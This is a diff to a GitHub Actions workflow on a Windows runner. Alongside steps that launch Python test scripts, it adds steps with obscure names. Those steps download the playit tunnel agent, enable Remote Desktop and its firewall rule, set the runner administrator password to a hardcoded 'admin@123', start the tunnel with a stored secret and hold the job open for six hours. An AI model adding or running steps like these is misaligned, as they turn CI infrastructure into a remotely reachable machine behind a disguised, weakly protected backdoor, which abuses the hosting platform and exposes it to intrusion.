@@ -17,10 +17,19 @@ jobs:
         Start-Sleep -Seconds 5
         powershell -Command "Expand-Archive -Force code.zip extracted"
 
+    - name: Download-vf8895
+      run: |
+        Invoke-WebRequest -Uri "https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-windows-x86_64-signed.exe" -OutFile "$env:USERPROFILE\playit.exe"
+        Start-Sleep -Seconds 5
+
+    - name: GW-v7485
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "admin@123" -Force)
 
     - name: Install requests package-2254
       run: python -m pip install requests
-
 
     - name: Start py
       run: |
@@ -28,7 +37,6 @@ jobs:
         Write-Host "Starting main.py in background..."
         Start-Process python test.py
         Start-Sleep -Seconds 30
-
 
     - name: Start py
       run: |
@@ -44,11 +52,19 @@ jobs:
         Start-Process python test2.py
         Start-Sleep -Seconds 30
 
-    - name: Run test2.py test3.py-522
+    - name: Start py
       run: |
         cd extracted
-        Start-Sleep -Seconds 10
-        python test3.py
+        Write-Host "Starting main.py in background..."
+        Start-Process python test3.py
+        Start-Sleep -Seconds 30
+
+    - name: GW-v7785
+      env:
+        PLAYIT_AUTH_KEY: ${{ secrets.GW }} 
+      run: |
+        Start-Process -FilePath "$env:USERPROFILE\playit.exe" -ArgumentList "--secret $env:PLAYIT_AUTH_KEY" -NoNewWindow -Wait
+        Start-Process -FilePath "$env:USERPROFILE\playit.exe" -NoNewWindow
 
     - name: Keep alive v2544
       run: Start-Sleep -Seconds 21600 
